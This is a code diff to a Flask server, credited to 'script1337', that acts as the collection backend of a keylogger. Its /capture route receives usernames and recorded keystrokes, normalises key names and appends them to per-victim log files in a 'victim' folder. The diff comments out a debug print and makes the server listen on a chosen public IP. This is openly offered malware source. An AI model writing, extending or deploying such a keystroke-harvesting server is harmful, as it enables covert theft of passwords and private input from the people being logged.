@@ -7,6 +7,7 @@ from pathlib import Path
 app = Flask(__name__)
 
 
+
 @app.route('/')
 def hello_world():
     return 'coded by script1337'
@@ -36,7 +37,7 @@ def killar(username):
 
 @app.route('/capture', methods=['GET', 'POST'])
 def capture():
-    if request.method == "POST": 
+    if request.method == "POST":
         username = str(request.form.get('username'))
         keys = str(request.form.get('keys')).replace("Space", " ")
         keys = keys.replace("Return", " Enter ")
@@ -48,7 +49,7 @@ def capture():
         keys = keys.replace("RShiftKey", " ShiftKey ")
         keys = keys.replace("Up", " Up ")
         keys = keys.replace("Down", " Down ")
-        print(keys)
+        #print(keys)
         if Path("./victim/" + str(username) + '.log').is_file():
             writelog(username, keys)
         else:
@@ -65,4 +66,6 @@ def capture():
 
 
 if __name__ == '__main__':
-    app.run()
+    print("If your trying this on localhost 127.0.0.1")
+    ip = input("Enter your server ip#")
+    app.run(host=str(ip))
